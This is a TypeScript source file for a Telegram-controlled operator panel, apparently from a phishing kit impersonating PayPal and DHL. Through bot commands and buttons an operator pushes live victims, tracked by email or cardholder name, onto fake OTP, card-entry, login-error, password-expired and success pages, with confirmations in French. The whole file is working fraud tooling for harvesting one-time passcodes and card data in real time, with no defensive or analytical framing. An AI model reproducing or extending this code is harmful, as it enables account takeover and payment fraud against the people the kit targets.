import { storage } from "./storage";

interface TelegramUpdate {
  update_id: number;
  message?: {
    message_id: number;
    from?: {
      id: number;
      is_bot: boolean;
      first_name: string;
      username?: string;
    };
    chat: {
      id: number;
      type: string;
    };
    date: number;
    text?: string;
  };
  callback_query?: {
    id: string;
    from: {
      id: number;
      is_bot: boolean;
      first_name: string;
      username?: string;
    };
    message?: {
      message_id: number;
      chat: {
        id: number;
        type: string;
      };
    };
    data?: string;
  };
}

let lastUpdateId = 0;
let pollingInterval: NodeJS.Timeout | null = null;

export async function startTelegramBot() {
  try {
    // Check environment variables first, then database
    let botToken = process.env.TELEGRAM_BOT_TOKEN;
    let chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!botToken || !chatId) {
      const settings = await storage.getAdminSettings();
      botToken = settings?.telegramBotToken || undefined;
      chatId = settings?.telegramChatId || undefined;
    }
    
    if (!botToken || !chatId) {
      console.log("Telegram bot not configured - skipping bot initialization");
      return;
    }

    // Stop existing polling if any
    if (pollingInterval) {
      clearInterval(pollingInterval);
    }

    console.log("Starting Telegram bot polling...");
    console.log(`Bot token source: ${process.env.TELEGRAM_BOT_TOKEN ? 'environment' : 'database'}`);

    // Poll for updates every 2 seconds
    pollingInterval = setInterval(async () => {
      try {
        await pollTelegramUpdates(botToken!);
      } catch (error) {
        console.error("Telegram polling error:", error);
      }
    }, 2000);
  } catch (error) {
    console.error("Failed to initialize Telegram bot:", error);
    console.log("Telegram bot will not be available");
    // Don't throw - let the app continue without Telegram
  }
}

async function pollTelegramUpdates(botToken: string) {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=1`,
      {
        method: "GET",
      }
    );

    const data = await response.json();

    if (data.ok && data.result && data.result.length > 0) {
      for (const update of data.result) {
        await handleTelegramUpdate(update, botToken);
        lastUpdateId = Math.max(lastUpdateId, update.update_id);
      }
    }
  } catch (error) {
    console.error("Failed to poll Telegram updates:", error);
  }
}

async function handleTelegramUpdate(update: TelegramUpdate, botToken: string) {
  // Handle callback queries (button clicks)
  if (update.callback_query) {
    await handleCallbackQuery(update.callback_query, botToken);
    return;
  }

  // Handle text messages (commands)
  const message = update.message;
  if (!message || !message.text) return;

  const text = message.text.trim();
  const chatId = message.chat.id;

  // PayPal commands
  if (text.startsWith("/otp_")) {
    const sessionId = text.replace("/otp_", "");
    await handlePayPalRedirectCommand(sessionId, "/paypal/otp", chatId, botToken);
    return;
  }

  if (text.startsWith("/error_")) {
    const sessionId = text.replace("/error_", "");
    await handlePayPalRedirectCommand(sessionId, "/paypal/failure", chatId, botToken);
    return;
  }

  // DHL commands
  if (text.startsWith("/dhl_otp_")) {
    const sessionId = text.replace("/dhl_otp_", "");
    await handleDhlRedirectCommand(sessionId, "/otp1", chatId, botToken);
    return;
  }

  if (text.startsWith("/dhl_error_")) {
    const sessionId = text.replace("/dhl_error_", "");
    await handleDhlRedirectCommand(sessionId, "/error", chatId, botToken);
    return;
  }

  // Legacy commands without underscore
  if (text.startsWith("/otp ")) {
    const sessionId = text.replace("/otp ", "");
    await handlePayPalRedirectCommand(sessionId, "/paypal/otp", chatId, botToken);
    return;
  }

  if (text.startsWith("/error ")) {
    const sessionId = text.replace("/error ", "");
    await handlePayPalRedirectCommand(sessionId, "/paypal/failure", chatId, botToken);
    return;
  }
}

async function handlePayPalRedirectCommand(
  sessionId: string,
  redirectUrl: string,
  chatId: number,
  botToken: string
) {
  try {
    const session = await storage.getPaypalSession(sessionId);

    if (!session) {
      await sendReply(
        chatId,
        botToken,
        `❌ Session <code>${sessionId}</code> introuvable.`
      );
      return;
    }

    if (session.status !== "waiting") {
      await sendReply(
        chatId,
        botToken,
        `⚠️ Session <code>${sessionId}</code> déjà traitée (${session.status}).`
      );
      return;
    }

    await storage.updatePaypalSession(sessionId, {
      redirectUrl,
      redirectVersion: (session.redirectVersion ?? 0) + 1,
      status: "waiting", // Keep as waiting to allow multiple redirects
    });

    const action = redirectUrl.includes("otp") ? "OTP" : "LOGIN ERROR";
    await sendReply(
      chatId,
      botToken,
      `✅ Client <code>${session.email}</code> redirigé vers <b>${action}</b>`
    );
  } catch (error) {
    console.error("Failed to handle redirect command:", error);
    await sendReply(
      chatId,
      botToken,
      `❌ Erreur lors de la redirection.`
    );
  }
}

async function handleDhlRedirectCommand(
  sessionId: string,
  redirectUrl: string,
  chatId: number,
  botToken: string
) {
  try {
    const session = await storage.getDhlSession(sessionId);

    if (!session) {
      await sendReply(
        chatId,
        botToken,
        `❌ Session <code>${sessionId}</code> introuvable.`
      );
      return;
    }

    if (session.status !== "waiting") {
      await sendReply(
        chatId,
        botToken,
        `⚠️ Session <code>${sessionId}</code> déjà traitée (${session.status}).`
      );
      return;
    }

    await storage.updateDhlSession(sessionId, {
      redirectUrl,
      redirectVersion: (session.redirectVersion ?? 0) + 1,
      status: "waiting", // Keep as waiting to allow multiple redirects
    });

    const action = redirectUrl.includes("otp") ? "OTP" : "ERROR";
    await sendReply(
      chatId,
      botToken,
      `✅ Client <code>${session.cardholderName}</code> redirigé vers <b>${action}</b>`
    );
  } catch (error) {
    console.error("Failed to handle redirect command:", error);
    await sendReply(
      chatId,
      botToken,
      `❌ Erreur lors de la redirection.`
    );
  }
}

async function handleCallbackQuery(query: any, botToken: string) {
  const data = query.data;
  const chatId = query.message?.chat.id;
  
  if (!data || !chatId) return;

  try {
    // Parse callback data: format is "type_action_sessionId"
    // Handle multi-word actions like "otp_error" by finding the last underscore
    const parts = data.split('_');
    const sessionId = parts[parts.length - 1]; // Last part is always sessionId
    const type = parts[0]; // First part is always type
    const action = parts.slice(1, -1).join('_'); // Middle parts form the action
    
    // Route button mappings
    const routeMap: Record<string, string> = {
      // PayPal routes
      'paypal_card': '/paypal/card',
      'paypal_error': '/paypal/failure',
      'paypal_waiting': '/paypal/waiting',
      'paypal_approve': '/paypal/approve',
      'paypal_password': '/paypal/password-expired',
      'paypal_otp1': '/paypal/otp',
      'paypal_otp2': '/paypal/otp',
      'paypal_otp': '/paypal/otp',
      'paypal_success': '/paypal/success',
      'paypal_home': '/',
      
      // DHL routes
      'dhl_error': '/error',
      'dhl_approve': '/approve',
      'dhl_otp': '/otp1',
      'dhl_otp_error': '/otp-error',
      'dhl_success': '/success',
      'dhl_loading': '/dhl/waiting',
      'dhl_home': '/',
    };

    const redirectUrl = routeMap[`${type}_${action}`];
    
    if (!redirectUrl) {
      await answerCallbackQuery(query.id, botToken, "❌ Action inconnue");
      return;
    }

    // Handle redirect based on type
    if (type === 'paypal') {
      const session = await storage.getPaypalSession(sessionId);
      if (!session || session.status !== 'waiting') {
        await answerCallbackQuery(query.id, botToken, "⚠️ Session déjà traitée");
        return;
      }

      await storage.updatePaypalSession(sessionId, {
        redirectUrl,
        redirectVersion: (session.redirectVersion ?? 0) + 1,
        status: "waiting", // Keep as waiting to allow multiple redirects
      });

      await answerCallbackQuery(query.id, botToken, `✅ Client redirigé vers ${action.toUpperCase()}`);
      await sendReply(chatId, botToken, `✅ Client <code>${session.email}</code> redirigé vers <b>${action.toUpperCase()}</b>`);
      
    } else if (type === 'dhl') {
      const session = await storage.getDhlSession(sessionId);
      if (!session || session.status !== 'waiting') {
        await answerCallbackQuery(query.id, botToken, "⚠️ Session déjà traitée");
        return;
      }

      await storage.updateDhlSession(sessionId, {
        redirectUrl,
        redirectVersion: (session.redirectVersion ?? 0) + 1,
        status: "waiting", // Keep as waiting to allow multiple redirects
      });

      await answerCallbackQuery(query.id, botToken, `✅ Client redirigé vers ${action.toUpperCase()}`);
      await sendReply(chatId, botToken, `✅ Client <code>${session.cardholderName}</code> redirigé vers <b>${action.toUpperCase()}</b>`);
    }
    
  } catch (error) {
    console.error("Failed to handle callback query:", error);
    await answerCallbackQuery(query.id, botToken, "❌ Erreur");
  }
}

async function answerCallbackQuery(queryId: string, botToken: string, text: string) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        callback_query_id: queryId,
        text,
        show_alert: false,
      }),
    });
  } catch (error) {
    console.error("Failed to answer callback query:", error);
  }
}

async function sendReply(chatId: number, botToken: string, text: string) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
      }),
    });
  } catch (error) {
    console.error("Failed to send Telegram reply:", error);
  }
}

export function stopTelegramBot() {
  if (pollingInterval) {
    clearInterval(pollingInterval);
    pollingInterval = null;
    console.log("Telegram bot polling stopped");
  }
}
